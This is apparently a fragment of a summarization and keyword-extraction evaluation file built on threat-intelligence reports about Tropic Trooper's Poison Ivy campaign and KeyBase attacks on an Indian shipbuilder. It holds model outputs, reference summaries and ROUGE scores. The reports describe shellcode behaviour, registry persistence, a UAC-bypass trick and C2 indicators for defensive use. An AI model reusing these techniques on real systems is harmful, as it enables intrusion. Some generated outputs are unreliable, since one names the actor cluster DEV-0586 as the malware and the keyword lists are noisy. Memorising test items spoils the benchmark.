the malware, which they track as WhisperGate, in Defender products. Recommended actions for organizations include investigating IOCs, reviewing remote access logs for anomalies, enabling multifactor authentication, and using features like Controlled Folder Access to block file modifications. The activity is attributed to a new temporary cluster DEV-0586, with no known associations to existing groups. The investigation is ongoing and Microsoft is sharing information to help organizations defend against this threat. In summary, the document provides details on new wiper malware used in intrusions targeting Ukraine, along with mitigation advice and IOCs to facilitate detection and response. <END-1>", "t5/keyword/hint_hit_precision": 0.24324324324324326, "t5/word/hint_hit_recall": 0.05240174672489083, "gpt3/lexical/rouge_rouge1": 0.43304843304843305, "gpt3/lexical/rouge_rouge2": 0.15472779369627507, "gpt3/lexical/rouge_rougeL": 0.2678062678062678, "gpt3/lexical/rouge_rougeLsum": 0.2678062678062678, "gpt3_generated_text": ["The Microsoft Threat Intelligence Center (MSTIC) has identified a destructive malware operation targeting multiple organizations in Ukraine on January 13. The malware, known as DEV-0586, appears to be designed to look like ransomware but lacks a ransom recovery mechanism, indicating its intent to be destructive. The malware overwrites the Master Boot Record (MBR) on victim systems with a fake ransom note, demanding $10k in Bitcoin and a message via Tox ID for recovery. This activity is inconsistent with typical cybercriminal ransomware behavior. MSTIC advises organizations to conduct thorough investigations and implement defenses against this threat. The impact of this malware on Ukrainian organizations is significant, and MSTIC continues to monitor the situation and provide updates as more information becomes available."]}, {"split_name": "val", "sample_id": "val_111", "prompt_text": "Extract the keywords: MENUBlog Home > Unit 42 > Tropic Trooper Targets Taiwanese Government and Fossil Fuel Provider With Poison IvyTropic IvyBy Vicky Ray, Robert Falcone, Jen Miller-Osborn and Tom Lancaster November 22, 2016 at 3:30 AM Category: Unit 42 Tags: APAC, Poison Ivy, Taiwan, threat research, Tropic Trooper305(3)Taiwan has been a regular target of cyber espionage threat actors for a number of years. Reasons for Taiwan being targeted range from being one of the sovereign states of the disputed South China Sea region to its emerging economy and growth with Taiwan being one of the most innovative countries in the High-Tech industry in Asia. In early August, Unit 42 identi\ufb01ed two attacks using similar techniques. The more interesting one was a targeted attack towards the Secretary General of  Taiwan\u2019s Government o\ufb03ce \u2013 Executive Yuan. The Executive Yuan has several individual boards which are formed to enforce di\ufb00erent executing    functions of the government. The Executive Yuan Council evaluates statutory and budgetary bills and bills concerning martial law, amnesty, declaration of war, conclusion of peace and treaties, and other important a\ufb00airs. Given the important functions undertaken by the Executive Yuan o\ufb03ce, it is not a    surprise that they were targeted. The second attack was against an energy sector company also located in Taiwan. The attacks in this case are associated with a campaign called Tropic Trooper, which has been active since at least 2011 and is known for heavily targeting Taiwan. One of the attacks used their known Yahoyah malware, but the other attack deployed the widely available Poison Ivy RAT. This con\ufb01rms the actors are using Poison Ivy as part of their toolkit, something speculated in the original Trend Micro report but not con\ufb01rmed by them.   Further analysis uncovered a handful of ties indicating the actors may also be using the PCShare malware family, which has not been previously tied to the group. Figure 1 shows the spear phishing email which was sent to the Secretary General of Executive Yuan. The email is spoofed so that it appears as though it was sent from a sta\ufb00 member at the Democratic Progressive Party (DPP). Figure The document attached to this e-mail exploits CVE-2012-0158, a Microsoft O\ufb03ce vulnerability. This process is described in the Malware Analysis   section later in this report, but one interesting aspect of this malicious was the decoy document the attacker chose to deploy. Decoy Document As we have noted in many earlier reports, attackers commonly use decoy \ufb01les to trick victims into thinking a malicious document is actually legitimate.  After infecting the computer, the display a clean document to the victim that contains content that is relevant to them. The decoy document used in this case is a spreadsheet with four tabs, respectively titled \u201cexample,\u201d \u201c0720,\u201d \u201c0721,\u201d and \u201c1041109 full update\u201d. All of the text uses Traditional Chinese, in contrast to Simpli\ufb01ed Chinese, which is the o\ufb03cial written language of the People\u2019s Republic of China. Traditional    Chinese is used in Taiwan, Hong Kong, Macau, and many overseas Chinese communities. The overarching theme of the spreadsheet is documenting protestor activity and/or progressive reform attempts in progress across Taiwan and the tone of the spreadsheet suggests it was compiled by progressive supporters. Because we were unable to \ufb01nd the spreadsheet online, and there is speci\ufb01c persona data included related to these movements  and protests, we are not including any screen shots except for the one below.Figure The \u201cexample\u201d spreadsheet tab is exactly as described \u2013 it contains the headers and suggested information within two of the remaining three tabs. The headers themselves translate, from left to right, to \u201cresponsible department,\u201d \u201cissue,\u201d \u201cdevelopments this week,\u201d \u201cpolitical situation judgment,\u201d and \u201crelated information.\u201d The tab labeled 0721 only has the matching headers and no additional information. None of the information in the spreadsheet relates to activities past 2015, and there are references made to the then upcoming January 16, 2016 elections in Taiwan. In that election the DPP won, displacing the Chinese Nationalist Party (KMT) for only the second time in history, and with Taiwan\u2019s \ufb01rst female President.  The spreadsheet labeled 0720 refers to the Anti-Black Box Movement, which was a protest by Taiwanese high school students against certain proposed curriculum changes. The use of \u201cblack box\u201d by the protestors is in reference to former Taiwanese President Ma Ying-Jeou\u2019s government and its lack of transparency concerning government decisions. Protestors occupied Taiwan\u2019s Ministry of Education last July. A resolution passed by Taiwan\u2019s legislature and approved by the Executive Yuan in May of this year delayed implementing that curriculum until 2020 to allow time for the act to be amended. The Anti-Black Box Movement is related to the Sun\ufb02ower Student Movement, a coalition of both student groups and other civic organizations that  protested the Cross-Strait Trade Agreement between Taiwan and the PRC, feeling it would hurt Taiwan\u2019s economy and increase the PRC\u2019s sway over the island. On March 17 2014, the KMT, the ruling party at the time, tried to force a vote without a previously agreed clause by clause review with the DPP. The following evening protesters occupied the Legislative Yuan, the \ufb01rst time that had occurred Taiwan\u2019s history. On March 23 of the same year, after  then President Ma re-a\ufb03rmed he supported the pact and would not alter or drop it, protestors occupied the Executive Yuan where over 150 were injured   and 61 arrested. The \ufb01nal tab contains the most information of the three and has di\ufb00erent headers. From left to right, the headers are titled \u201cresponsible person(s),\u201d   \u201csummary of issues and major groups,\u201d \u201ccrisis simulation, political judgment, and recommendations,\u201d \u201cdegree of tension,\u201d and \u201cparticipating members.\u201dInformation related to the November 2015 \u201cAutumn Struggle\u201d protest, which is an annual protest \ufb01rst done in 2013.  Information on a Taichung City government development proposal being protested largely on environmental impact grounds, and protestor Army 1 Special Forces veterans attempt to receive compensation for alleged illegal extension of forced military service The recently settled case where toll workers forced into unemployment by the Taiwanese government\u2019s agreement with the Far Eastern Electronic Toll Collection Company to create a national electronic toll collection system ended up resulting in the 2013 layo\ufb00s of hundreds, who have since  protested for new jobs as well as lost severance and pension. Kaohsiung re\ufb01nery closing and protestor demands, also largely related to environmental e\ufb00ects and necessary cleanup; the re\ufb01nery o\ufb03cially closed      at the end of December 2015 Closely watching any trade agreements between the Malaysian government and Taiwan Potential environmental and current residential issues related to the development of the Aerotropolis around Taoyuan International Airport, which is intended to create a major transportation hub and industry center for Asia with infrastructure for corporate research and development, conference centers, and other facilities. The Puyu Development Plan, which is part of Taiwan\u2019s Knowledge-based Economy plan Taiwan\u2019s 12-year compulsory education plan Anti-Black Box Movement demands and recent activity Improving working conditions for Taiwanese \ufb01re\ufb01ghters   Pension reforms The Nest Movement, which started in 2014 and is related to the older \u201cShell-less Snail Movement,\u201d focused on a\ufb00ordable housing, neighborhood  and urban development, ending forced demolition and relocation, property tax reform, and related housing issues The Environmental Impact Assessment (EIA) voted on by the Environmental Protection Bureau (EPB) for the Dongshi-Fengyuan Expressway, part of the National Highway #4 Project and anti-eviction e\ufb00orts  Kaohsiung water quality issues and related projects Same sex marriage legalization Protecting old trees in Kaohsiung amidst construction for a new \u201cgreen\u201d library; most of the designated \u201cprecious trees\u201d are rare exotic species Indigenous peoples in Kaohsiung land return Activities against the Miramar Resort Village, including the revocation of the EIA, forcing development to halt Lowering the voting age in Taiwan from 20 to 18Malware Analysis The documents attached to spear-phishing e-mails used in both attacks contain code that exploits CVE-2012-0158, which despite its age remains one of the most common Microsoft Word vulnerabilities being exploited by multiple threat actors. This matches with known Tactics, Techniques, and Procedures (TTPs) for Tropic Trooper, targeting both government institutions and also the energy industry in Taiwan. The delivery document uses the XLSX extension typically used by OpenXML documents, but the \ufb01le itself is actually an OLE (XLS) document. The \ufb01le   extension to \ufb01le type discrepancy was caused by the actor using Excel\u2019s built-in encryption capability, which stores XLSX ciphertext and the information  needed for decryption in an OLE document. Filename: \u2f2f.xlsx Type: CDF V2 Document, No summary info Size: 327128 bytes The embedded shellcode enumerates open handles for a \ufb01le with a size greater than 0xa6f0 (Decimal \u2013 42736) bytes. It will then set the \ufb01le pointer to   0xa6e8 (Decimal \u2013 42728) and starts looking for the following delimiter: GfCv\\xef\\xfe\\xec\\xceIf it \ufb01nds this delimiter, the shellcode knows it is working with the correct \ufb01le and continues by reading 0x600 (decimal 1536) bytes following this   delimiter. The shellcode then decrypts the \ufb01rst 0xc0 (decimal 192) DWORDs of the data read from the \ufb01le using an XOR algorithm that decrypts one   DWORD of ciphertext at a time with 0x29f7c592. The resulting cleartext is a second piece of shellcode that continues carrying out further functionality. The secondary shellcode starts by resolving the following API functions using a ROT13 hashing algorithm: kernel32.dll!CreateFileA kernel32.dll!ReadFile kernel32.dll!WriteFile kernel32.dll!SetFilePointer kernel32.dll!CopyFileA kernel32.dll!MoveFileExA kernel32.dll!CreateToolhelp32Snapshot kernel32.dll!Process32Next kernel32.dll!CloseHandle kernel32.dll!VirtualAlloc kernel32.dll!WinExec kernel32.dll!TerminateProcess kernel32.dll!LoadLibraryA kernel32.dll!lstrlenA kernel32.dll!lstrcpyA kernel32.dll!lstrcatA kernel32.dll!GetTempPathA kernel32.dll!WideCharToMultiByte kernel32.dll!QueryDosDeviceA ntdll.dll!NtQueryObject advapi32.dll!RegOpenKeyA advapi32.dll!RegSetValueExA advapi32.dll!RegCloseKey Immediately following these API functions there are three DWORDS; one used to locate the payload embedded within the exploit \ufb01le, one for the size of  the payload, and one for the size of decoy document. The two size values are added together to get the length of the ciphertext that the shellcode will decrypt. In the sample we analyzed, the following values were present, showing that the payload is at o\ufb00set 0xabc0 and has a size of 0x45218:  DWORD o\ufb00set_toPayload; (0ABC0h)  DWORD payload_Size; (1C600h) DWORD decoy_Size; (28C18h) The shellcode then creates a string that it uses to create a registry key to automatically run the \ufb01nal payload each time the system starts. It then opens  the registry key \u2018Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u2019 and sets the value to the \u201cShell\u201d subkey to the previously created string. Ultimately, the following registry key is created for persistence: HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell: \u201cexplorer.exe,rundll32.exe \u201cC:\\Documents and Settings\\Administrator\\Application Data\\Identities\\Identities.ocx\u201d SSSS\u201d It then uses the \u201co\ufb00set_toPayload\u201d value as an o\ufb00set that it will read 283160 (45218h) bytes from the XLS \ufb01le. The shellcode then enters a decryption    loop to convert the embedded payload from ciphertext to cleartext. The algorithm uses the length of the ciphertext negated as the initial encryption key, which it bit rotates right by 1 to adjust the key for each of decryption. It will use this key to decrypt four bytes of the ciphertext with the XOR operation until all the ciphertext is decrypted. During each iteration of the decryption process, the algorithm will check to make sure the four bytes of ciphertext are not equal to the key or equal to zero before decrypting the ciphertext. The following table contains the \ufb01rst \ufb01ve rounds of the algorithm to explain the   Type: Zip archive data, at least v2.0 to extract Size: 166936 bytes Last Modified By: Windows \u2f64 Created: 2016:07:21 03:15:34Z Type: PE32 executable for MS Windows (DLL) (GUI) Intel 80386 32-bit Size: 116224 bytes Compiled: 2016-05-23 07:00:51 As you can see from the table above, the algorithm decrypts what is an embedded portable executable that acts as the payload in this attack. The embedded payload is written to %APPDATA\\Identities\\Identities.ocx and has the following attributes: The decoy document, described in the section above, is saved to %TEMP%\\\u2f2f.xlsx and has the following attributes: The shellcode will move the decoy document to the location of the originally executed XLSX \ufb01le and will create the following command:  cmd /c start excel /e \u201c<path to original XLSX \ufb01le, now decoy  document>\u201d Before running the above command to open the decoy document, the shellcode enumerates the running processes on the system, speci\ufb01cally looking  for processes created for an executable with a \ufb01lename that starts with \u201cavp.\u201d, presumably in an attempt to \ufb01nd Kaspersky\u2019s antivirus process. If the   process is found, the shellcode will not open the decoy document and exits. The shellcode does not launch the payload, rather it relies on the registry key it created for persistence to execute the payload when the user reboots the system, meaning during dynamic analysis the execution of the payload may be missed. Delivered Payload \u2013 Poison Ivy When the system starts up, the persistence registry key will launch the Identities.ocx payload and call its \u201cSSSS\u201d exported function. The \u201cSSSS\u201d function checks to make sure that the DLL is running within the context of a \u201crundll32.exe\u201d process and then begins piecing 0x141B bytes of data together in the correct order to build the shellcode of the Poison Ivy Trojan.Campaign ID: MyUser Group ID: MyGroup C2 Cnt: 3 - C2 #1: news.hpc.tw:53 - C2 #2: account.sino.tw:80 Comm Key: twone Mutex: (V!hex67) Auto-remove Dropper Flag: 1 Active Setup value name: StubPath Default browser path reg key: SOFTWARE\\Classes\\http\\shell\\open\\command Active Key registry key: Software\\Microsoft\\Active Setup\\Installed Components\\We found and parsed the following con\ufb01guration from the Poison Ivy shellcode:  Looking for more samples which exhibited the same \ufb01le structure, encryption and obfuscation to deliver the above Poison Ivy sample yielded only two  additional samples. In the other two instances the delivered payloads were respectively PCShare and Yahoyah. PCShare has not been previously associated with Tropic Trooper, but in addition to the aforementioned overlaps, the two samples have passive DNS overlap with some known Tropic Trooper infrastructure. For those reasons, we assess with limited con\ufb01dence the group is also using this malware family. Figure The below table shows the details of the documents, payload delivered and the C2 servers used for communications. Filename CTC Statement.xlsx belindianlab[.]itemdb[.]com Filename _.xlsx www[.]dpponline[.]trickip[.]org www[.]myinfo[.]ocry[.]com 223.27.35[.]244It is interesting to see that the exploit documents we found had either low or no detections on most popular antivirus engines, showing that the threatactors behind this campaign have been having considerable success in bypassing static analysis undertaken by traditional antivirus solutions with this technique. We further expanded our search using the AutoFocus Threat Intelligence platform on the IOCs extracted from the PIVY, PCShare and Yahoyah payloads and found 42 samples which either matched unique behaviors, the unique PIVY mutex or had common C2 infrastructure. The hashes of all the samples found are given in the appendix section at the end of this blog. Figure 4 below shows the compilation timestamps of the payload samples found using AutoFocus. Given some of the payloads that were used in recent attacks, which were compiled months before, it shows that the threat actor group continues to reuse the payload within their exploit documents.Figure The below Maltego graph shows some of the shared infrastructure which have been used by Tropic Trooper. The complete list of indicators on the graph can also be found in the appendix section of this report.Figure The Tropic Trooper threat actor group has been known to target governments and organizations in the Asia Paci\ufb01c region for at least six years. In  addition to using Yahoyah malware, we were able to con\ufb01rm they are also using Poison Ivy and possibly PCShare malware families. They are also still  exploiting CVE 2012-0158, as are many threat actors. Palo Alto Networks customers are protected from Tropic Trooper\u2019s malicious activities by:WildFire correctly identi\ufb01es all related malware as malicious  The C2 infrastructure are classi\ufb01ed as malicious in PAN-DB  Traps prevents exploitation of CVE-2012-0158Autofocus customers can discover additional information on Tropic Trooper via the following AutoFocus tags:Tropic Trooper Samples matching unique indicators, behaviors and C2 infrastructure from the payload extracted out of the malicious documents: news[.]hpc[.]tw www[.]dpponline[.]trickip[.]org www[.]forensic[.]zyns[.]com www[.]bannered[.]4dq[.]comwww[.]forensic611[.]3-a[.]net bbs[.]zzbooks[.]net bbs[.]ccdog[.]net wallstreet[.]1dumb[.]com www[.]cham[.]com[.]tw pinkker[.]zzux[.]com www[.]amberisic611[.]4dq[.]com www[.]metacu[.]ygto[.]com bbs[.]zzbook[.]net www[.]myinfo[.]ocry[.]com www[.]gmal1[.]com news[.]hpc[.]tw www[.]dpponline[.]trickip[.]org pinkker[.]zzux[.]com wallstreet[.]1dumb[.]com redpeach[.]youdontcare[.]com redapple[.]justdied[.]com stone[.]mypop3[.]org zeus[.]jkub[.]com sniper[.]mynumber[.]org unclesam[.]jungleheart[.]com arora[.]x24hr[.]com \ufb02anando[.]fartit[.]com  www[.]dpponline[.]trickip[.]org www[.]myinfo[.]ocry[.]com belindianlab[.]itemdb[.]com kr[.]dns1[.]usC2 hxxp://www[.]dpponline[.]trickip[.]org/images/D2015_id[.]jpg hxxp://223[.]27[.]35[.]244/images/D2015_id[.]jpg hxxp://www[.]myinfo[.]ocry[.]com/images/D2015_id[.]jpg hxxp://belindianlab[.]itemdb[.]com/1613986301|C7A5398FBD8214C92F6596CC39B8866B0121E53422D6B8378E5D1F5F63844D693810BDED362511ED3630DC4F6A2B1302354C31242753DACB331EF3CF808E4E107B12F103F0C040F87DAA6CAB0676A25EBC673D9DFA078915F93361308E10BB5BA7DF1A90FEB614F1A1F12C7A135B60926A5D49FCE025F577FE0DEE937C803BE27D hxxp://202[.]153[.]193[.]73/images/kong[.]24[.]jpg hxxp://113[.]10[.]221[.]89/images/kong[.]24[.]jpg hxxp://61[.]221[.]169[.]31/images/kongj[.]24[.]jpg hxxp://www[.]forensic611[.]3-a[.]net/monitor/images/Smarp140102[.]24[.]gif hxxp://www[.]bannered[.]4dq[.]com/monitor/images/Smarp140102[.]24[.]gif hxxp://www[.]forensic[.]zyns[.]com/monitor/images/Smarp140102[.]24[.]gif hxxp://113[.]10[.]221[.]89/Pictures/sbsb_0620[.]24[.]jpg hxxp://bbs[.]ccdog[.]net/Pictures/sbsb_0620[.]24[.]jpg hxxp://www[.]forensic611[.]3-a[.]net/monitor/images/Smartzh131225[.]24[.]gif hxxp://www[.]bannered[.]4dq[.]com/monitor/images/Smartzh131225[.]24[.]gif hxxp://www[.]forensic[.]zyns[.]com/monitor/images/Smartzh131225[.]24[.]gif hxxp://bbs[.]zzbooks[.]net/Pictures/lclc_0523[.]24[.]jpg hxxp://bbs[.]ccdog[.]net/Pictures/lclc_0523[.]24[.]jpg hxxp://113[.]10[.]221[.]89/Pictures/lclc_0523[.]24[.]jpg hxxp://50[.]117[.]38[.]164/Pictures/dzh_0925[.]24[.]jpg hxxp://www[.]cham[.]com[.]tw/images/dzh_0925[.]24[.]jpg hxxp://113[.]10[.]221[.]89/Pictures/dzh_0925[.]24[.]jpg hxxp://bbs[.]ccdog[.]net/Pictures/jpg_140430[.]24[.]jpg hxxp://198[.]100[.]122[.]66/Pictures/jpg_140430[.]24[.]jpghxxp://192[.]69[.]221[.]92/Pictures/jpg_140430[.]24[.]jpg hxxp://www[.]bannered[.]4dq[.]com/monitor/images/SmartNav141216[.]64[.]gif hxxp://www[.]amberisic611[.]4dq[.]com/monitor/images/SmartNav141216[.]64[.]gif hxxp://www[.]metacu[.]ygto[.]com/monitor/images/SmartNav141216[.]64[.]gif hxxp://www[.]metacu[.]ygto[.]com/monitor/images/SmartNav141216[.]32[.]gif hxxp://www[.]amberisic611[.]4dq[.]com/monitor/images/SmartNav141216[.]32[.]gif hxxp://www[.]bannered[.]4dq[.]com/monitor/images/SmartNav141216[.]32[.]gif hxxp://bbs[.]ccdog[.]net/Pictures/20150120-hex[.]64[.]jpg hxxp://23[.]27[.]112[.]216/Pictures/20150120-hex[.]64[.]jpg hxxp://bbs[.]zzbook[.]net/Pictures/20150120-hex[.]64[.]jpg hxxp://bbs[.]zzbook[.]net/Pictures/20150120-hex[.]32[.]jpg hxxp://23[.]27[.]112[.]216/Pictures/20150120-hex[.]32[.]jpg hxxp://bbs[.]ccdog[.]net/Pictures/20150120-hex[.]32[.]jpg hxxp://bbs[.]ccdog[.]net/Pictures/h20141212012[.]64[.]jpg hxxp://23[.]27[.]112[.]216/Pictures/h20141212012[.]32[.]jpg hxxp://113[.]10[.]221[.]89/Pictures/h20141212012[.]32[.]jpg hxxp://bbs[.]ccdog[.]net/Pictures/h20141212012[.]32[.]jpg hxxp://113[.]10[.]221[.]89/Pictures/ooba_0823[.]24[.]jpg hxxp://198[.]100[.]122[.]66/Pictures/ooba_0823[.]24[.]jpg hxxp://50[.]117[.]38[.]164/Pictures/ooba_0823[.]24[.]jpg hxxp://www[.]metacu[.]ygto[.]com/monitor/images/SmartNav0120[.]64[.]gif hxxp://www[.]amberisic611[.]4dq[.]com/monitor/images/SmartNav0120[.]64[.]gif hxxp://www[.]bannered[.]4dq[.]com/moitor/images/SmartNav0120[.]64[.]gif hxxp://www[.]bannered[.]4dq[.]com/moitor/images/SmartNav0120[.]32[.]gif hxxp://www[.]metacu[.]ygto[.]com/monitor/images/SmartNav0120[.]32[.]gif hxxp://www[.]amberisic611[.]4dq[.]com/monitor/images/SmartNav0120[.]32[.]gif hxxp://www[.]dpponline[.]trickip[.]org/images/D2015_id[.]jpg hxxp://223[.]27[.]35[.]244/images/D2015_id[.]jpg hxxp://www[.]myinfo[.]ocry[.]com/images/D2015_id[.]jpg hxxp://49[.]254[.]211[.]75//tedws/1[.]64[.]jpg hxxp://107[.]183[.]183[.]235/public/1[.]64[.]jpg hxxp://49[.]254[.]211[.]75//tedws/1[.]32[.]jpg hxxp://107[.]183[.]183[.]235/public/1[.]32[.]jpg hxxp://\ufb02anando[.]fartit[.]com/2015/p1[.]64[.]jpg  hxxp://\ufb02anando[.]fartit[.]com/2015/p1[.]32[.]jpg Got something to say?Leave a comment Notify me of followup comments via e-mailName (required)Email (required)WebsiteWebsiteSUBMITSUBSCRIBE TO NEWSLETTERSEmailCOMPANY Report a VulnerabilityLEGAL NOTICES Privacy Policy Terms of UseACCOUNT Manage Subscription\u00a9 2016 Palo Alto Networks, Inc. All rights reserved.SALES > 866.320.4788SEE A DEMOTAKE A TEST DRIVESUBSCRIBE ", "generated_text": "a campaign; Tropic Trooper; 2011; the attacks; the secretary general; Executive Yuan; the government; at least 2011; Fossil fuel provider; the group; Poison Ivy; RAT; GNUFree; Analysis; malware; decoy documents; work; the decoy document; a 2013 document; a spreadsheet; organized events; protests; 2014; 2015; the Anti-Black Box Movement; students; trends; the government; summary; ties.", "ref_text": "<START-1>The report from Palo Alto Networks details attacks by a threat actor group called Tropic Trooper, which has been active since at least 2011 targeting organizations in Taiwan and other Asia Pacific countries. Tropic Trooper typically uses spearphishing emails containing exploits to deliver malware like Yahoyah. The report confirms they also use Poison Ivy and possibly PCShare malware. In August 2016, Tropic Trooper targeted Taiwan's Executive Yuan government office and a fossil fuel company with spearphishing using weaponized Office documents exploiting CVE-2012-0158. The malware payload was Poison Ivy configured to communicate with command and control servers typically hacked third party systems. The decoy document contained content related to Taiwanese political and activist movements. Infrastructure analysis uncovered ties between Yahoyah, Poison Ivy, and PCShare malware used by Tropic Trooper. The group actively maintains and reuses malware and exploits over time. Tropic Trooper appears to be a persistent, organized threat group focused on targets in Taiwan and the Asia Pacific region. Their tactics rely on social engineering and known exploits rather than zero-days. Protection measures against Tropic Trooper include blocking their infrastructure, preventing Office exploit delivery, behavioral analysis to detect malware execution, and other threat prevention techniques. <END-1>", "t5/keyword/hint_hit_precision": 0.36666666666666664, "t5/word/hint_hit_recall": 0.09743589743589744, "gpt3/lexical/rouge_rouge1": 0.40372670807453415, "gpt3/lexical/rouge_rouge2": 0.14375000000000002, "gpt3/lexical/rouge_rougeL": 0.2298136645962733, "gpt3/lexical/rouge_rougeLsum": 0.2298136645962733, "gpt3_generated_text": ["The article discusses a cyber espionage campaign known as Tropic Trooper, which has been targeting Taiwan since at least 2011. The attacks include targeting the Secretary General of Taiwan's government office, the Executive Yuan, as well as a fossil fuel provider in Taiwan. The group behind the attacks is using Poison Ivy RAT malware, as well as possibly the PCShare malware family. The attacks involve spear phishing emails with decoy documents containing information on organized events and protests in Taiwan. The decoy document in this case is a spreadsheet focusing on progressive reform attempts and protestor activity in Taiwan, with references to events in 2014 and 2015. This highlights the ongoing threat of cyber espionage targeting the Taiwanese government and related entities."]}, {"split_name": "val", "sample_id": "val_112", "prompt_text": "Extract the keywords: 2/28/2017Cyber Attack Targeting Indian Navy's Submarine and Warship Manufacturer - Cysinfo\uf3abCYBER ATTACK TARGETING INDIAN NAVY\u2019S SUBMARINE AND WARSHIP MANUFACTURER3 WEEKS AGO \u2022 ARTICLES \u202221\uf34dIn my previous blog posts I described attack campaigns targeting Indian government organizations, and Indian Embassies andMinistry of External a airs. In this blog post I describe a new attack campaign where cyber espionage group targeted the users ofMazagon Dock Shipbuilders Limited (also called as ship builder to the nation). Mazagon Dock Shipbuilders Limited (MDL) is aPublic Sector Undertaking of Government of India (Ministry of Defence) and it specializes in manufacturing warships and submarinesfor the Indian Navy.In order to infect the users associated with Mazagon Dock Shipbuilders Limited (MDL), the attackers distributed spear-phishingemails containing malicious excel  le which when opened drops a malware capable of spying on infected systems. The emailpurported to have been sent from legitimate email ids. The attackers spoofed the email id associated with a Spain based equipmentmanufacturing company Hidrofersa which specializes in designing, manufacturing naval, industrial and mining machinery.Overview of the Malicious EmailsOn 26th January, 2017 Indian Navy displayed its state-of-the-art stealth guided missile destroyer INS Chennai and the indigenously-made Kalvari class Scorpene submarines at the Republic Day parade showcasing India\u2019s military strength and achievements. INSChennai and Kalvari class submarines were manufactured by Mazagon Dock Shipbuilders Limited (MDL).On 25th January (day before the Republic day) attackers spoofed an email id associated with Hidrofersa a Spain based companywhich specializes in designing, manufacturing naval, industrial and mining machinery and the email was sent to the users ofMazagon Dock Shipbuilders Limited (MDL). The email attachment contained two malicious excel  les (both excel  les turned out tobe same but used di erent names). The email was made to look like it was sent by a General service manager of Hidrofersaenquiring about the product delivery schedule.Below screen shot shows the recipients associated with Mazagon Dock Shipbuilders Limited (MDL), this information was determinedfrom the Email header.Mazagon Dock Shipbuilders Limited (MDL) is listed as one of clients of Hidrofersa (mentioned in Hidrofersa website) and as per theirwebsite Hidrofersa has shipped equipments to Mazagon Dock Shipbuilders Limited (MDL) in the past as shown in the below screenshots. This is probably the reason attackers spoofed the email id of Hidrofersa as it is less likely to trigger any suspicion and there isurl Attack Targeting Indian Navy's Submarine and Warship Manufacturer - Cysinfohigh chance of recipients opening the attachment as it is coming from a trusted equipment manufacturer (Hidrofersa) . It looks like \uf3abattackers carefully researched (or they already knew about) the trust relationship between these two companies.From the email it looks like the goal of the attackers was to infect, take control of the systems of users associated with MazagonDock Shipbuilders Limited (MDL) and to steal sensitive information (like Product design documents, blueprints, manufacturingprocesses etc) related to warships and submarines.Analysis of Malicious Excel FileWhen the recipient of the email opens the attached excel  le it prompts the user to enable macro content and the excel alsocontains instruction on how to enable the macros.Once the the macro content is enabled, it calls an auto execute function Workbook_Open() which in turn downloads the malwaresample and executes on the system. The malicious macro code was reverse engineered to understand its capabilities. The macrocode was heavily obfuscated (used obscure variable/function names to make analysis harder) as shown below.url Attack Targeting Indian Navy's Submarine and Warship Manufacturer - CysinfoThe macro also contained lot of junk code, unnecessary comments and variable assignments as shown below. The attackers probably compromised the university website to host the malware. The technique of hosting malicious code in a university site (legitimate site) has advantages and it is unlikely to trigger any suspicion in security monitoring and also can bypass reputation based devices. The PowerShell script (shown below) drops the downloaded executable in the %TEMP% directory as \u201cdoc6.exe\u201c. It then adds a registry entry for the dropped executable and invokes eventvwr.exe, this is an interesting registry hijack technique which allows the doc6.exe to be executed by eventvwr.exe with high integrity level and also this technique silently bypasses the UAC (user account control). This technique of UAC bypass is mentioned in the blog \u201cFileless\u201d UAC Bypass Using eventvwr.exe and Registry Hijacking. Normally when eventvwr.exe process (which is running as high integrity process) is invoked, it starts mmc.exe which opens eventvwr.msc causing the Event Viewer to be displayed. To start mmc.exe, eventvwr.exe searches this registry key. The dropped \u00d2le (doc6.exe) was determined as KeyBase malware. This malware can steal and send sensitive information to the attackers like keystrokes, opened applications, web browsing history, usernames/passwords, upload Desktop screen shots etc. The feature of uploading the Desktop screen shot is notable because if the infected user opens a design or design document related to submarines or warships the screen shot of that can be sent to the attacker. The attackers also hosted multiple samples of KeyBase malware in the compromised university website. Below screen shot shows hashes of 25 samples hosted on the university site. Analysis of the Dropped Executable (doc6.exe) The dropped \u00d2le was analyzed in an isolated environment (without actually allowing it to connect to the c2 server). This section contains the behavioral analysis of the dropped executable. Once the dropped \u00d2le (doc6.exe) is executed the malware copies itself into %AllUsersPro\u00d2le% directory as \u201cImportant.exe\u201d, In addition to that it also drops two \u00d2les \u201cMails.txt\u201d and \u201cBrowsers.txt\u201d into the same directory as shown below. The malware then creates a registry value for the the dropped \u00d2le (Important.exe), this ensures that malware is executed every time the system restarts. The malware after execution keeps track of the user activity (like applications opened, \u00d2les opened etc) but does not immediately generate any network tra\u00d5c, this is to make sure that no network activity is generated during automated/sandbox analysis. After sleeping for a long time malware makes an http connection to the C2 server (command & control server) and sends the tracked user activity to the attacker. The below screen shot shows the communication to the C2 server on port 80. Once malware makes an http connection after sleeping for a long time, it sends the system information and the tracked activity to the C2 server as http parameters. Below screen shot shows the network communication pattern where the hostname and the machine time is sent to C2 server. Below screen shot shows a network communication pattern where the opened window title was sent to the C2 server, this pattern below indicates that \u201ctest.txt\u201d \u00d2le was opened with notepad on the infected system. Below screen shot shows a network communication pattern indicating a document named \u201csecret.docx\u201d was opened with Microsoft Word. Threat Intelligence Even though attackers tried to make it look like the spear phishing email was sent by an email id associated with Hidrofersa but inspecting the email headers revealed some interesting information. Based on the information mentioned above, It looks like the spoofed email was sent by a user associated with a Pakistan based company Combined Freight (PVT) Limited. Indicators Of Compromise In this case the cyber espionage group targeted Mazagon Dock Shipbuilders Limited (MDL) but it is possible that other defense equipment manufacturers could also be targeted as part of this attack campaign. The indicators associated with this attack are provided so that the organizations (Government, Public, Private organizations, Defense and Defense equipment manufacturers) can use these indicators to detect, remediate and investigate this attack campaign. Below are the indicators.", "generated_text": "the attackers; spear-phishing emails; Excel; malware; scanning; the malware; the user; the user; the Excel; Malicious Excel File; the user; The macros; the macros; the malware; the user; malicious code; the payload; indicators; compromise; the malware; the user; the Malicious Excel.", "ref_text": "<START-1>The PDF describes a cyberattack campaign targeting Mazagon Dock Shipbuilders Limited (MDL), an Indian company that manufactures submarines and warships for the Indian Navy. - On January 25, 2017, the day before India's Republic Day celebrations, attackers sent spear-phishing emails pretending to be from a Spanish naval equipment company called Hidrofersa. The emails contained malicious Excel files that installed a malware called KeyBase if macros were enabled. The attackers researched the trust relationship between MDL and Hidrofersa, a equipment manufacturer, to increase the chances of recipients opening the attachment. - KeyBase is a spyware that can steal sensitive information like keystrokes, screenshots, browser history etc and send it back to the attackers. The timing of the attack suggests the attackers wanted to steal 